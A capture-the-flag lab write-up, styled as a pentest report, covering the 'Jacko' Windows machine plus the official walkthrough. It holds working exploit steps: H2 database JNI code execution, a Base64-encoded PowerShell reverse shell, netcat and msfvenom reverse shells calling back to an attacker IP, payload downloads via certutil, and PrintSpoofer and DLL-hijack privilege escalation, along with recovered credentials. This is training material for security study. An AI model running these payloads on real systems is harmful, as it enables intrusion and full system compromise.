# Jacko
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| Remote Code Execution | EDB-ID-49384 |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: jacko
* Description: A machine best paired with a nice cup of coffee.
* IP Address: 192.168.146.66
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: Microsoft Windows 10 Pro (ref: systeminfo)
* Kernel: 0.0.18363 N/A Build 18363 (1903) (ref: systeminfo)
* Architecture: (ref:)
* KBs Installed:
  * KB4552931
  * KB4497165
  * KB4513661
  * KB4516115
  * KB4517245
  * KB4521863
  * KB4537759
  * KB4552152
  * KB4556799

### Ports
```bash
# Nmap 7.91 scan initiated Sun Jul 18 21:36:30 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/jacko-nmap-complete 192.168.146.66
Nmap scan report for 192.168.146.66
Host is up (0.078s latency).
Not shown: 65535 open|filtered ports, 65529 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7680/tcp open  pando-pub
8082/tcp open  blackice-alerts

# Nmap done at Sun Jul 18 21:41:18 2021 -- 1 IP address (1 host up) scanned in 287.97 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sun Jul 18 21:44:44 2021 as: nmap -sV -sC -pT:80,135,139,445,7680,8082 -oN scans/jacko-nmap-versions 192.168.146.66
Nmap scan report for 192.168.146.66
Host is up (0.14s latency).

PORT     STATE    SERVICE       VERSION
80/tcp   open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
7680/tcp filtered pando-pub
8082/tcp open     http          H2 database http console 1.4.199
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-19T01:44:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 21:45:39 2021 -- 1 IP address (1 host up) scanned in 54.38 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sun Jul 18 21:46:48 2021 as: nmap -O -oN scans/jacko-nmap-os 192.168.146.66
Nmap scan report for 192.168.146.66
Host is up (0.078s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8082/tcp open  blackice-alerts
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|router|broadband router|proxy server|webcam|terminal|printer
Running (JUST GUESSING): AVtech embedded (98%), Linksys embedded (95%), OneAccess embedded (95%), Blue Coat embedded (95%), Polycom pSOS 1.X (95%), Wyse ThinOS 5.X (95%), Ricoh embedded (90%)
OS CPE: cpe:/h:oneaccess:1641 cpe:/h:bluecoat:packetshaper cpe:/o:polycom:psos:1.0.4 cpe:/o:wyse:thinos:5.2 cpe:/h:ricoh:aficio_sp_c240sf
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (98%), Linksys BEFSR41 EtherFast router (95%), OneAccess 1641 router (95%), Blue Coat PacketShaper appliance (95%), Polycom MGC-25 videoconferencing system (pSOS 1.0.4) (95%), Wyse ThinOS 5.2 (95%), Ricoh Aficio SP C240SF printer (90%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 21:47:02 2021 -- 1 IP address (1 host up) scanned in 13.60 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.146.66

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
victor@kali:~/oscp/pg/labs/jacko$ smbclient -L 192.168.146.66
Enter WORKGROUP\victor's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
```bash
# tony:BeyondLakeBarber399
```

### H2 Database JNI Code Execution
#### EDB-ID-49384
Part 1 
```bash
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),
...snipped...
```

Part 2 
```bash
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
```

Part 3
```bash
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
```

Part 4
```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c dir").getInputStream()).useDelimiter("\\Z").next()');

# output
Volume in drive C has no label.
Volume Serial Number is AC2F-6399

Directory of C:\Program Files (x86)\H2\service

04/27/2020  09:00 PM    <DIR>          .
04/27/2020  09:00 PM    <DIR>          ..
02/28/2017  06:07 AM             1,659 0_run_server_debug.bat
02/28/2017  06:07 AM             1,501 1_install_service.bat
02/28/2017  06:07 AM                66 2_start_service.bat
02/28/2017  06:07 AM                29 3_start_browser.bat
02/28/2017  06:07 AM                27 4_stop_service.bat
02/28/2017  06:07 AM             1,294 5_uninstall_service.bat
03/18/2018  12:34 PM             2,615 serviceWrapperLicense.txt
04/27/2020  02:05 PM             3,737 wrapper.conf
02/28/2017  06:07 AM            81,920 wrapper.dll
02/28/2017  06:07 AM           204,800 wrapper.exe
02/28/2017  06:07 AM            83,820 wrapper.jar
04/27/2020  09:18 PM             4,573 wrapper.log
              12 File(s)        386,041 bytes
               2 Dir(s)   6,928,457,728 bytes free
```

Part 5
```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c type wrapper.conf").getInputStream()).useDelimiter("\\Z").next()');

# output
...snipped...
wrapper.ntservice.account=.\tony
wrapper.ntservice.password=BeyondLakeBarber399
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
Encoded a PowerShell-based reverse shell in Base64 using...PowerShell.
```pwsh
$Command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.49.146",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)

$EncodedCommand = [Convert]::ToBase64String($Bytes)

$EncodedCommand

# output
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANAA2ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= 
```

```bash
cp /usr/share/windows-binaries/nc.exe .
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
sudo python3 -m http.server 8082
sudo nc -nvlp 80
```

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANAA2ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= ").getInputStream()).useDelimiter("\\Z").next()');
```

```bash
cd c:\users\tony\desktop
echo "foo" > foo.txt
dir
iwr -uri http://192.168.49.146:8082/nc.exe -outfile nc.exe
iwr -uri http://192.168.49.146:8082/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
exit

sudo nc -nvlp 80
```

```bash
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\users\\tony\\desktop\\nc.exe 192.168.49.146 80 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
```

```bash
cd c:\users\tony\desktop
PrintSpoofer.exe -i -c cmd

# output
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.
```

```bash
whoami

# output
nt authority\system
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* xclip
* powershell
* nc
* PrintSpoofer64.exe

## Hints
* Have you tried default credentials?
* It's possible to run Java code on H2 without a compiler. Keyword: JNI.
* Have a look at installed programs which would only be accessible locally. 

## Flags
* local.txt = 270bb06efb50b29d778fe823dbcc3b55
* proof.txt = 8aac8e9e8edb2ef940fb301c0d2bec8e

## Lessons Learned
* Use PowerShell to encode PowerShell commands
* Use base64 to get around encoded challenges
* Verify you have write access (echo "foo" > foo.txt) before attempting to download anything onto the target
* cat file.txt | xclip -selection c

## Official Walkthrough
```bash
Exploitation Guide for Jacko
Summary

We discover a misconfigured H2 database with default credentials running on this machine. We’ll exploit this misconfiguration to gain command execution. Finally, we’ll escalate our privileges by exploiting a DLL hijacking vulnerability in Fujitsu’s Paperstream IP program.
Enumeration
Nmap

We’ll begin with an nmap scan.

kali@kali:~$ sudo nmap 192.168.140.66
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 06:35 EST
Nmap scan report for 192.168.140.66
Host is up (0.32s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds

H2 Database

Port 8082 is serving a web interface for an H2 database. In the quickstart section of the H2 documentation, we find that the default username is sa with a blank password. We’re able to log in with these credentials and execute SQL queries.
Exploitation
H2 Database Code Execution

We find this exploit on EDB that describes how to achieve remote code execution on H2 without JDK installed on the target machine. As detailed in the exploit, we’ll first execute the SQL statement to write our DLL to the C:\Windows\Temp directory.

SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),...,'"'), 'ISO-8859-1', '', '', '', '', '');

Next, we’ll run the following SQL commands to load our DLL and create an alias for it:

CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

Finally, we can run the following statements to achieve command execution:

CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
desktop-cmvk5k4\tony

H2 Database Reverse Shell

Now let’s try to pivot this into a reverse shell. To do this, we’ll first generate an MSFVenom reverse shell payload.

kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

Next, we’ll host this payload over HTTP.

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Let’s start a Netcat handler to catch our shell.

kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...

To trigger our shell, we’ll run the following SQL statement to download our payload to the target machine:

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.118.3/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

We can now execute our payload with the following SQL statement:

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

Finally, we catch our reverse shell. We’ll also fix our PATH variable so that we can execute some common commands.

kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
192.168.140.66: inverse host lookup failed: Unknown host
connect to [KALI] from (UNKNOWN) [192.168.140.66] 49813
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>set PATH=%SystemRoot%\system32;%SystemRoot%;
set PATH=%SystemRoot%\system32;%SystemRoot%;

C:\Program Files (x86)\H2\service>whoami
whoami
jacko\tony

Escalation
Service Enumeration

Within C:\Program Files (x86), we find an interesting program: PaperStream IP.

C:\Program Files (x86)\H2\service>dir "C:\Program Files (x86)"
dir "C:\Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of C:\Program Files (x86)

04/27/2020  08:01 PM    <DIR>          .
04/27/2020  08:01 PM    <DIR>          ..
04/27/2020  07:59 PM    <DIR>          Common Files
04/27/2020  08:01 PM    <DIR>          fiScanner
04/27/2020  07:59 PM    <DIR>          H2
04/24/2020  08:50 AM    <DIR>          Internet Explorer
03/18/2019  08:52 PM    <DIR>          Microsoft.NET
04/27/2020  08:01 PM    <DIR>          PaperStream IP
03/18/2019  10:20 PM    <DIR>          Windows Defender
03/18/2019  08:52 PM    <DIR>          Windows Mail
04/24/2020  08:50 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
03/18/2019  10:23 PM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   6,925,905,920 bytes free

The readmeenu.rtf file contains the version information.

C:\Program Files (x86)\H2\service> type "C:\Program Files (x86)\PaperStream IP\TWAIN\readmeenu.rtf"
{\rtf1\ansi\ansicpg932\deff0\deflang1033\deflangfe1041{\fonttbl{\f0\fnil\fcharset0 Microsoft Sans Serif;}{\f1\fswiss\fprq2\fcharset0 Microsoft Sans Serif;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\nowidctlpar\sl276\slmult1\f0\fs18 ---------------------------------------------------------------------------------------------------------\par
fi Series\par
PaperStream IP driver 1.42\par
README file\par
---------------------------------------------------------------------------------------------------------\par
Copyright PFU LIMITED 2013-2016\par
\par
\par
This file includes important notes on this product and also the additional information not included in the manuals.\par
\par
---------------------------------------------------------------------------------------------------------\par

PaperStream IP Exploitation

Searching EDB for this program and version information, we discover CVE-2018-16156. To exploit this, we’ll first generate a reverse shell payload.

kali@kali:~$ msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.118.3 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
Saved as: shell.dll

We’ll then host our malicious DLL and the PaperStream exploit over HTTP.

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

We can now download them to the target machine.

C:\Program Files (x86)\H2\service>cd \Windows\Temp
cd \Windows\Temp

C:\Windows\Temp>certutil -urlcache -split -f http://192.168.118.3/shell.dll shell.dll
certutil -urlcache -split -f http://192.168.118.3/shell.dll shell.dll
****  Online  ****
  0000  ...
  1400
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp>certutil -urlcache -split -f http://192.168.118.3/exploit.ps1 exploit.ps1
certutil -urlcache -split -f http://192.168.118.3/exploit.ps1 exploit.ps1
****  Online  ****
  0000  ...
  0937
CertUtil: -URLCache command completed successfully.

Next, we’ll start a Netcat handler to catch our reverse shell.

kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...

Let’s run our exploit.

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe C:\Windows\Temp\exploit.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...

If all goes as planned, we’ll catch our reverse shell as nt authority\system.

kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
192.168.179.66: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.179.66] 49883
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
